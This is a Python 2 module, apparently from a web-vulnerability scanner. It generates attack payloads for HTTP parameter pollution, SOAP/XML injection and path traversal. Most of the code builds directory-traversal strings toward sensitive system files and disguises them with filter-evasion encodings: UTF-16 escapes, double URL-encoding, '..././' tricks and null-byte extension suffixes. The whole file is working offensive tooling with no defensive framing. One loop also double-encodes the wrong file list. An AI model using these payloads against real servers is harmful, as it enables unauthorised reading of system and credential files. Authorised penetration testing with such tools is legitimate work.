import HTTPRequester
import urllib
import random

payload_type = None
pathtraversalaux_linux = 'TxtAux/LinuxPathTraversal.txt'
pathtraversalaux_windows = 'TxtAux/WindowsPathTraversal.txt'
parameter_pollution_payload = '&rab=oof'
###################################
soap_inj_foo = '</foo>'
soap_inj_foo_closed = '<foo></bar>'
soap_inj_comment = '<!--'
soap_inj_close_comment = '<!--beasted!-->'
###################################
pttestafter = ['...', '"""', "<<<>>>"]
pttestbefore = ['./././', 'gotya/../', 'gotya//....//', 'gotya\\\\....\\\\', 'gotya\\..\\..\\']
ptaddition = '../../../../../../../../../../../../'
nullbytes = ['%00.pdf', '%00.jpg', '%00.png', '%00.jpeg', '%00.mpeg', '%00.mp4', '%00.html', '%00.php', '%00.jsp', '%00.asp', '%00.js', '%00.cgi']
###################################
paylist = None
lessthanutf16 = '%u003C'
greaterthanutf16 = '%u003E'
exclamationutf16 = '%u0021'
hyphenutf16 = '%u002D'
dotutf16 = '%u002e'
forwardslashutf16 = '%u2215'
backslashutf16 = '%u2216'
andutf16 = '%u0026'
equalutf16 = '%u003D'
fullstoputf16 = '%u002E'


def setType(option):
    global payload_type
    payload_type = option


def payloadslist(option):
    global paylist
    if option == 'pp':
        parameter_pollution_payload_gen()
    if option == 'si':
        soap_injection_payload_gen()
    if option == 'pt':
        path_traversal_payload_gen()
    return paylist


def parameter_pollution_payload_gen():
    global paylist, parameter_pollution_payload, andutf16, equalutf16
    paylist = []
    paylist.append(urllib.quote_plus(parameter_pollution_payload))
    paylist.append(urllib.quote_plus(urllib.quote_plus(parameter_pollution_payload)))
    paylist.append(parameter_pollution_payload.replace('=', equalutf16).replace('&', andutf16))


def soap_injection_payload_gen():
    global paylist, soap_inj_foo, soap_inj_foo_closed, soap_inj_comment, soap_inj_close_comment
    paylist = []
    paylist.append([urllib.quote_plus(soap_inj_foo), urllib.quote_plus(soap_inj_foo_closed)])
    paylist.append([urllib.quote_plus(urllib.quote_plus(soap_inj_foo)), urllib.quote_plus(urllib.quote_plus(soap_inj_foo_closed))])
    paylist.append([soap_inj_foo.replace('<', lessthanutf16).replace('/', forwardslashutf16).replace('>', greaterthanutf16),
                    soap_inj_foo_closed.replace('<', lessthanutf16).replace('/', forwardslashutf16).replace('>', greaterthanutf16)])

    paylist.append([urllib.quote_plus(soap_inj_comment), urllib.quote_plus(soap_inj_close_comment)])
    paylist.append(
        [urllib.quote_plus(urllib.quote_plus(soap_inj_comment)), urllib.quote_plus(urllib.quote_plus(soap_inj_close_comment))])
    paylist.append(
        [soap_inj_comment.replace('<', lessthanutf16).replace('!', exclamationutf16).replace('-', hyphenutf16),
         soap_inj_close_comment.replace('<', lessthanutf16).replace('!', exclamationutf16).replace('-', hyphenutf16).replace('>', greaterthanutf16)])

def path_traversal_payload_gen():
    global paylist, pttestafter, pttestbefore

    with open(pathtraversalaux_windows) as f:
        content = f.readlines()
    windows_files = [x.strip() for x in content]
    windows_files = random.sample(windows_files, 10)

    additions = []
    for path in windows_files:
        additions.append(ptaddition + path)

    additions2 = []
    for adds in additions:
        aux = adds
        newitem = aux.replace('/', '\\')
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('/', forwardslashutf16)
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('/', '\/')
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('/', backslashutf16 + forwardslashutf16)
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('../', '..././')
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('../', fullstoputf16+fullstoputf16+fullstoputf16+fullstoputf16+forwardslashutf16+fullstoputf16+forwardslashutf16)
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('../', '...\.\\')
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('../', fullstoputf16+fullstoputf16+fullstoputf16+fullstoputf16+backslashutf16+fullstoputf16+backslashutf16)
        additions2.append(newitem)


    windows_files = windows_files + additions + additions2

    additions = []
    for path in windows_files:
        for nullbyte in nullbytes:
            additions.append(path + nullbyte)

    windows_files = windows_files + additions

    windows_payloads = []
    for wf in windows_files:
        windows_payloads.append(urllib.quote_plus(wf))

    for wf in windows_files:
        windows_payloads.append(urllib.quote_plus(urllib.quote_plus(wf)))


    with open(pathtraversalaux_linux) as f:
        content = f.readlines()
    linux_files = [x.strip() for x in content]
    linux_files = random.sample(linux_files, 10)

    additions = []
    for path in linux_files:
        additions.append(ptaddition + path)

    additions2 = []
    for adds in additions:
        aux = adds
        newitem = aux.replace('/', '\\')
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('/', forwardslashutf16)
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('/', '\/')
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('/', backslashutf16 + forwardslashutf16)
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('../', '..././')
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('../',
                              fullstoputf16 + fullstoputf16 + fullstoputf16 + fullstoputf16 + forwardslashutf16 + fullstoputf16 + forwardslashutf16)
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('../', '...\.\\')
        additions2.append(newitem)

        aux = adds
        newitem = aux.replace('../',
                              fullstoputf16 + fullstoputf16 + fullstoputf16 + fullstoputf16 + backslashutf16 + fullstoputf16 + backslashutf16)
        additions2.append(newitem)

    linux_files = linux_files + additions + additions2

    additions = []
    for path in linux_files:
        for nullbyte in nullbytes:
            additions.append(path + nullbyte)

    linux_files = linux_files + additions

    linux_payloads = []
    for lf in linux_files:
        linux_payloads.append(urllib.quote_plus(lf))

    for lf in windows_files:
        linux_payloads.append(urllib.quote_plus(urllib.quote_plus(lf)))

    k = 0
    while k < len(pttestbefore):
        pttestbefore[k] = urllib.quote_plus(pttestbefore[k])
        k = k + 1

    k = 0
    while k < len(pttestafter):
        pttestafter[k] = urllib.quote_plus(pttestafter[k])
        k = k + 1

    paylist = [pttestbefore, pttestafter, windows_payloads, linux_payloads]
